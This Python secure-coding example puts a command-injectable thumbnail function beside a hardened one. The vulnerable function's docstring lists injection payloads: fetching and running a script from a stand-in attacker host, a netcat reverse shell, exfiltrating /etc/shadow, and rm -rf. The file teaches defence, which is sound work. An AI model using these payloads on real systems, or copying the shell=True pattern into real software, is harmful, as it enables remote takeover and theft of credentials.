"""
Command Injection — vulnerable and secure variants, side by side.

Scenario: an endpoint that converts a user-uploaded image to a
thumbnail using the `convert` binary (ImageMagick). The filename is
accepted as input and invoked via subprocess.

The vulnerable version is the pattern that gets shipped to production
with alarming frequency: a developer needs to call an external tool,
builds a command with an f-string, and reaches for `shell=True` because
"it's easier." Every character in the filename becomes an attacker-
controlled shell metacharacter.
"""

import shutil
import subprocess
from pathlib import Path


UPLOADS_DIR = Path("/srv/uploads").resolve()
OUTPUT_DIR = Path("/srv/thumbnails").resolve()


# ---------------------------------------------------------------------------
# VULNERABLE: shell=True with string interpolation.
# ---------------------------------------------------------------------------
def convert_image_vulnerable(filename: str) -> Path:
    """
    Exploit payloads that achieve RCE as the service user:

      "photo.png; curl -fsSL https://evil.example.com/r.sh | bash"
        → runs the attacker's shell script after convert completes.

      "photo.png && nc attacker.example.com 4444 -e /bin/sh"
        → reverse shell.

      "photo.png $(cat /etc/shadow | base64 | curl -d @- evil.example.com)"
        → exfiltrates /etc/shadow via DNS or HTTP.

      "'; rm -rf /srv ;'"
        → destructive payload, easy to trigger accidentally.

    The shell parses all of these because `shell=True` hands the entire
    command string to /bin/sh. There is no safe way to sanitize this;
    the defense is to never invoke a shell in the first place.
    """
    output = OUTPUT_DIR / f"{filename}.jpg"
    subprocess.run(
        f"convert {UPLOADS_DIR}/{filename} {output}",
        shell=True,
        check=True,
    )
    return output


# ---------------------------------------------------------------------------
# SECURE: argument list, no shell, with input validation.
# ---------------------------------------------------------------------------
def convert_image_secure(filename: str) -> Path:
    """
    Defenses applied, in order:

      1. Resolve the requested path and verify it stays inside UPLOADS_DIR.
         Prevents "../../../etc/passwd" traversal.

      2. Reject paths that are symlinks or non-regular files. Prevents
         symlink-swap attacks where the attacker uploads a symlink.

      3. Resolve the `convert` binary from a fixed absolute path (found
         once at startup). Prevents PATH-manipulation attacks.

      4. Pass arguments as a list with `shell=False`. No shell means no
         shell metacharacter parsing. The filename can contain spaces,
         quotes, semicolons, pipes — all are treated as literal bytes.

      5. Bound the subprocess with a timeout so a malicious input that
         triggers a denial-of-service in ImageMagick (there have been
         several CVEs like this) cannot hang the worker forever.
    """
    # 1 + 2: resolve and validate the input path.
    source = (UPLOADS_DIR / filename).resolve()
    if UPLOADS_DIR not in source.parents and source != UPLOADS_DIR:
        raise ValueError("path traversal detected")
    if not source.is_file() or source.is_symlink():
        raise ValueError("source must be a regular file")

    output = OUTPUT_DIR / f"{source.stem}.jpg"

    # 3: resolve the binary once, at module load in a real app.
    convert_bin = shutil.which("convert")
    if convert_bin is None:
        raise RuntimeError("convert binary not found on PATH")

    # 4 + 5: arg list, no shell, bounded execution.
    subprocess.run(
        [convert_bin, str(source), str(output)],
        shell=False,
        check=True,
        timeout=30,
        capture_output=True,
    )
    return output


# ---------------------------------------------------------------------------
# Review notes:
#
# - `shell=True` is a smell. In 95% of cases the "convenience" it buys
#   (globbing, pipes, redirection) is not actually needed. When it is,
#   use Python primitives to do the work: glob.glob for wildcards,
#   subprocess.Popen + pipes for pipelines, open() for redirection.
#
# - Even with `shell=False`, a user-controlled *first argument* can
#   still be a problem — consider `convert --help-format=/etc/passwd`
#   style flag injection. If the attacker controls any arg, validate
#   that the arg does not start with `-` or `--`, or use `--` before
#   passing the untrusted arg (e.g., `["convert", "--", user_arg]`).
#
# - `subprocess.run(..., timeout=N)` is not a security boundary on its
#   own — the process may still do damage in that window. Combine with
#   a seccomp/AppArmor profile or run inside an ephemeral container.
# ---------------------------------------------------------------------------
